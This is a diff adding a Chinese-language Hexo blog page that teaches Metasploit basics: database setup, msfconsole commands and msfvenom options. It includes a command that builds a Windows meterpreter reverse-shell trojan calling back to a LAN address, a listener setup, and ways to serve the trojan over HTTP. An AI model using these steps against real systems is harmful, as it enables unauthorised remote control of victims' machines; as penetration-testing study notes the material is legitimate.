@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>MSF基础 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="基础12345678910111213141516171819warnning:msf数据库未开会显示警报,但是不影响使用,有需求可以开systemctl enable postgresql        设置postgresql开机自启systemctl disable postgresql    禁止开机自启systemctl:            enable    设置开机自启">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MSF基础">
+<meta property="og:url" content="http://yoursite.com/2021/07/18/MSF%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="基础12345678910111213141516171819warnning:msf数据库未开会显示警报,但是不影响使用,有需求可以开systemctl enable postgresql        设置postgresql开机自启systemctl disable postgresql    禁止开机自启systemctl:            enable    设置开机自启">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-07-18T08:42:26.000Z">
+<meta property="article:modified_time" content="2021-07-18T08:45:30.855Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.0.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-MSF基础" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/07/18/MSF%E5%9F%BA%E7%A1%80/" class="article-date">
+  <time datetime="2021-07-18T08:42:26.000Z" itemprop="datePublished">2021-07-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      MSF基础
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">warnning:</span><br><span class="line">msf数据库未开会显示警报,但是不影响使用,有需求可以开</span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> postgresql        设置postgresql开机自启</span><br><span class="line">systemctl <span class="built_in">disable</span> postgresql    禁止开机自启</span><br><span class="line"></span><br><span class="line">systemctl:    </span><br><span class="line">        <span class="built_in">enable</span>    设置开机自启</span><br><span class="line">        <span class="built_in">disable</span>    禁止开机自启</span><br><span class="line">        start    运行服务</span><br><span class="line">        stop    停止服务</span><br><span class="line">        status    查看运行状态</span><br><span class="line">        restart    重启服务</span><br><span class="line">service:</span><br><span class="line">    service service_name 指令</span><br><span class="line">        start</span><br><span class="line">        stop    </span><br><span class="line">        stauts</span><br><span class="line">        restart            </span><br></pre></td></tr></table></figure>
+
+<p><strong>!!!:指令可以用tab补全</strong></p>
+<p>msfconsole        控制台</p>
+<p>msfvenom         木马生成平台</p>
+<p>exp: 攻击脚本</p>
+<p>poc: 验证脚本</p>
+<p>信息搜集 –&gt; 漏洞探测 –&gt; 漏洞利用 –&gt; 提权 –&gt; 横向渗透 –&gt; 植入后门 –&gt; 痕迹清除</p>
+<p>​    [ metasploit v6.0.16-dev                          ]</p>
+<ul>
+<li>– –=[ 2073 exploits - 1124 auxiliary - 352 post       ]</li>
+<li>– –=[ 596 payloads - 45 encoders - 10 nops            ]</li>
+<li>– –=[ 7 evasion                                       ]</li>
+</ul>
+<p>exploits: 漏洞利用脚本</p>
+<p>payloads: 攻击载荷</p>
+<p>auxiliary: 辅助模块</p>
+<p>post: 后渗透模块</p>
+<p>encoders: 编码模块</p>
+<p>nops: 空模块</p>
+<p>evasion: 逃避模块</p>
+<p><code>第一次运行msf需要初始化数据库,因为用到db_nmap需要用到数据库</code></p>
+<p>msfdb init    初始化数据库</p>
+<p>msfdb start    开启数据库</p>
+<p>连接数据库:</p>
+<ol>
+<li><p>db_connect -y /usr/share/metasploit-framework/config/database.yml</p>
+</li>
+<li><p>db_connect user:<a href="mailto:&#x70;&#97;&#x73;&#x73;&#119;&#x6f;&#114;&#100;&#x40;&#49;&#x32;&#x37;&#46;&#x30;&#46;&#x30;&#46;&#49;">&#x70;&#97;&#x73;&#x73;&#119;&#x6f;&#114;&#100;&#x40;&#49;&#x32;&#x37;&#46;&#x30;&#46;&#x30;&#46;&#49;</a>/database_name</p>
+</li>
+</ol>
+<h5 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令:"></a>基础指令:</h5><h5 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole:"></a>msfconsole:</h5><p>msf是用ruby语言写的,脚本后缀为.rc文件</p>
+<p>help     查看帮助信息</p>
+<p>exit        退出当前的控制台</p>
+<p>load      加载.rc的脚本</p>
+<p>sessions    查看当前收到的会话</p>
+<p>sessions -i id   进入会话</p>
+<p>sessions -k id 杀死指定会话</p>
+<p>sessions -K      杀死所有的会话  </p>
+<p>bg | background   返回控制台</p>
+<p>set          设置参数</p>
+<p>setg         设置全局参数</p>
+<p>unload    卸载脚本</p>
+<p>unset        卸载参数</p>
+<p>unsetg     卸载全局参数</p>
+<p>info            显示模块的信息</p>
+<p>options    显示参数的信息</p>
+<p>search        搜索脚本</p>
+<p>show            显示模块及参数信息</p>
+<p>use                使用模块</p>
+<p>run                运行辅助模块,跟exploit没有区别都可以用</p>
+<p>exploit        运行攻击脚本</p>
+<p>exploit | run -j   后台监听</p>
+<p>run -z          持久化监听</p>
+<p>run -j -z       后台持久监听</p>
+<p>back            返回上一级</p>
+<p>jobs            操作相关的工作</p>
+<p>jobs -k id    删除指定任务</p>
+<p>jobs -K        删除所有的任务</p>
+<p>kill                杀死会话</p>
+<h5 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom:"></a>msfvenom:</h5><p>-l,–list        列出相关的模块信息</p>
+<p>-p,–payloads    指定payload</p>
+<p>-e                指定编码模块</p>
+<p>-f                指定输出格式</p>
+<p>-a                指定架构(x86,x64)</p>
+<p>-o                指定输出的文件</p>
+<p>-b                bad Characters,坏字符,可以规避一些字符</p>
+<p>-n                设置空模块</p>
+<p>-i                    指定编码次数</p>
+<p>-x                    指定模板</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">基操:</span><br><span class="line">常用payload:</span><br><span class="line">windows/x64/meterpreter/reverse_tcp windows/x64/meterpreter/reverse_tcp_rc4 windows/x64/meterpreter/bind_tc windows/x64/meterpreter/bind_tcp_rc4 windows/x64/meterpreter/reverse_https windows/x64/meterpreter/reverse_http</span><br><span class="line"></span><br><span class="line">生成木马:</span><br><span class="line">-p指定的payload要与msfconsole指定的payload一致,不然无法监听到木马的反弹</span><br><span class="line">msfvenom  -p windows/meterpreter/reverse_tcp lhost=<span class="number">192.168</span><span class="number">.1</span><span class="number">.135</span> lport=<span class="number">4444</span> -f exe -o shell.exe</span><br><span class="line"></span><br><span class="line">建立监听器:</span><br><span class="line">LHOST:设置本地监听的IP</span><br><span class="line">LPORT:设置本地监听的端口</span><br><span class="line">RHOSTS:设置远程IP</span><br><span class="line"></span><br><span class="line">stage: 传输器    --&gt; 存放paylaod的一个容器</span><br><span class="line">stager: 传输体     --&gt; 用来传输stage的一个通道</span><br><span class="line">    </span><br><span class="line">use exploit/multi/handler 设置渗透模块</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp 设置有效载荷</span><br><span class="line">set LHOST IP 设置本地接收ip</span><br><span class="line">set LPORT port 设置本地接收端口</span><br><span class="line">exploit | run 运行模块开始监听</span><br><span class="line"></span><br><span class="line">木马下放:</span><br><span class="line"><span class="number">1.</span> servic apache2 start</span><br><span class="line">    apache是web服务的一个中间件</span><br><span class="line">    默认路径: /var/www/html</span><br><span class="line">    访问方式: http://IP</span><br><span class="line">    注意事项: 可能会碰到默认页面,删除掉/var/www/html下的index.html文件即可</span><br><span class="line"><span class="number">2.</span> python2</span><br><span class="line">    用编程语言开放的服务器,服务器路径的话就是在当前目录下开放服务</span><br><span class="line">    python -m SimpleHTTPServer port</span><br><span class="line"><span class="number">3.</span> python3</span><br><span class="line">    python3 -m http.server port</span><br></pre></td></tr></table></figure>
+
+<h4 id="linux的快捷键"><a href="#linux的快捷键" class="headerlink" title="linux的快捷键"></a>linux的快捷键</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ctrl+u    删除光标之前的内容</span><br><span class="line">ctrl+k    删除光标之后的内容</span><br><span class="line">ctrl+d  删除当前光标所在的内容</span><br><span class="line">ctrl+h    向前删除一个内容</span><br><span class="line">ctrl+a    跳到开头</span><br><span class="line">ctrl+e    跳到最后</span><br><span class="line">ctrl+r    搜索历史操作的指令,回车执行</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/07/18/MSF%E5%9F%BA%E7%A1%80/" data-id="ckr8yfd8f0001kcvj46bo5aes" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/07/16/Socat%E4%BD%BF%E7%94%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Socat使用</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/07/18/MSF%E5%9F%BA%E7%A1%80/">MSF基础</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/16/Socat%E4%BD%BF%E7%94%A8/">Socat使用</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">信息搜集</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/">注册表自启动和粘滞键后门</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/">基础命令</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
